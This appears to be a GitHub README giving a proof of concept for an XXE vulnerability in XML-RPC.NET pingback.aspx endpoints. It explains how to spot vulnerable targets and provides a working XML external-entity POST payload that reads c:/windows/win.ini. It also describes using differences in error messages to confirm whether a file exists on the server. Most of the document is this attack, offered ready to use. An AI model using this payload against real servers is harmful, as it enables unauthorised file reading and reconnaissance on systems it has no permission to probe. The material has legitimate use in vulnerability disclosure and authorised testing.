# xmlrpc.net-poc
Proof of Concept (PoC) for XML-RPC.NET XXE

1. Identify a vulnerable pingback.aspx endpoint. "CookComputing" tends to be a strong signal.

![xmlrpc-xxe-1](https://user-images.githubusercontent.com/3679232/207164709-a158b1c6-3b73-480f-b01b-c33bc1daf2d9.png)

2. Leverage the following XXE POST payload:

'''
<?xml version="1.0" encoding="ISO-8859-1"?> 
<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM  
"file://c:/windows/win.ini">]><foo>&xxe;</foo> 
'''

3. Request a non-existent file on the remote server (e.g. "winFAKE.ini")

![xml-rpc-2](https://user-images.githubusercontent.com/3679232/207167707-80d2eb52-6402-496e-acb0-12ed9ef30400.png)

4. Request an existent file on the remote server (e.g. "win.ini"). Note the error message is different when requesting access to an existing file. This validates our XXE is working as intended.

![xml-rpc-3](https://user-images.githubusercontent.com/3679232/207167024-7338126f-6736-4f14-9a64-b6a0ecc7417e.png)


